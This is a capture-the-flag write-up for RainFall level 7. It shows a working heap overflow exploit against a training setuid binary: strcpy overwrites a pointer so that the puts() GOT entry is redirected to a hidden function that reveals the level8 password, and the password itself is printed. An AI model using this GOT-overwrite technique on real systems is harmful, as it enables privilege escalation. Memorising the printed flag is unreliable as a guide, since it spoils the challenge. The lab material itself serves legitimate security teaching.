# Level7

We can find an executable who segfault without parameter and print "~~" with 2 params.  
```
level7@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 bla
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 bla bla
~~
level7@RainFall:~$
```
After analyze it with gdb we can see a `main()` and a non-called `m()` function.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level7/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level7/source.c) for more details.  
Lets talk about the `main()`.   
<br/>

There is 2 malloc(8) for each argv[1] && argv[2].  
It uses `strcpy()` to copy the strings in av[0] and av[1] to their respective allocated memory.
`strcpy()` is unprotected and will copy until it reaches the end of the string.  
We can see that the program retrieve the flag with `fgets()` and saves it in a global variable c but does nothing with it.  
During the first call to `strcpy()`, we can overwrite the address used as destination for the second `strcpy()` (b[1]) => we want to overwrite function `puts()` GOT address to call function `m()` instead.  
1. Let's get the offset necessary to overwrite b[1] by using ltrace to print libc calls.  
```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                       = 0x0804a008
malloc(8)                                                       = 0x0804a018
malloc(8)                                                       = 0x0804a028
malloc(8)                                                       = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level7@RainFall:~$
```
Thanks to the pattern generator we found that the offset start at 20.  
2. We need to find the `puts()` GOT entry (the pointer to overwrite) :
```
level7@RainFall:~$ gdb level7
(gdb) info function puts
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
(gdb) disass 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928         <----- Found it !!
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
(gdb)
```
3. We can test an overwrite on b[1] with ltrace to be sure
```
level7@RainFall:~$ ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') bla
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                       = 0x0804a008
malloc(8)                                                       = 0x0804a018
malloc(8)                                                       = 0x0804a028
malloc(8)                                                       = 0x0804a038
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")           = 0x0804a018
strcpy(0x08049928, "bla")                                       = 0x08049928
fopen("/home/user/level8/.pass", "r")                           = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level7@RainFall:~$
```
Now we know that, our payload should look like :
```
    padding (20 bytes) + GOT address (4 bytes)   +   m() function address (4 bytes)
                     1st arg                                   2nd arg
```
*`m()` address is easily foundable in gdb (info function m) : 0x080484f4*
4. Now we can overwrite b[1] to call `m()`
```
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1606130489
level7@RainFall:~$ su level8
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
level8@RainFall:~$
```
Level7 passed!
